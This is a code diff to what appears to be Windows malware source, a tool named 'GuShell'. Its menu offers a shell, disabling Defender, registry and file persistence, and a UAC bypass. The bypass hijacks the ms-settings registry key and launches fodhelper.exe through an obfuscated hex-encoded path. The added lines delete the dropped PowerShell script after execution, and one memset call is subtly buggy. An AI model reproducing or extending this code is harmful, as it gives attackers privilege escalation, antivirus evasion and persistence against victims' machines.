@@ -567,11 +567,20 @@ void bypassUACWithFod(TCHAR* dirName) {
 	// "echo Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value $gushellpath -Force >> inter.ps1"
 	system(setDef);
 	
-	wchar_t line2[300] = L"PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+	wchar_t* line2 = (wchar_t*)malloc(300 * sizeof(wchar_t));
+
+	wcscpy(line2, L"PowerShell.exe -ExecutionPolicy Unrestricted -command \"");
 	wcscat(line2, powerShellPath);
 	wcscat(line2, L"\"");
 
 	_wsystem(line2);
+
+	memset(line2, 0, sizeof line2);
+	wcscpy(line2, L"del ");
+	wcscat(line2, powerShellPath);
+	
+	_wsystem(line2);
+	free(line2);
 
 	char fodDir[] = { 0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, 0x5c, 0x66, 0x6f, 0x64, 0x68, 0x65, 0x6c, 0x70, 0x65, 0x72, 0x2e, 0x65, 0x78, 0x65, 0x00 };
 
@@ -624,7 +633,9 @@ int main(int argc, char* argv[]) {
 		"1. Drop into a shell\n"
 		"2. Attempt to stop defender\n"
 		"3. Attempt registry persistence.\n"
-		"4. Attempt full persistence with files and reg.\n";
+		"4. Attempt full persistence with files and reg.\n"
+		"5. Attempt UAC Bypass.\n"
+		"6. Kill GuShell Process.\n";
 
 	char commandOpt[50];
 
@@ -674,7 +685,13 @@ int main(int argc, char* argv[]) {
 
 		if (strcmp(commandOpt, "5") == 0) {
 			bypassUACWithFod(dirName);
+			continue;
 		}
+
+		if (strcmp(commandOpt, "6") == 0) {
+			return 0;
+		}
+
 
 	}
 
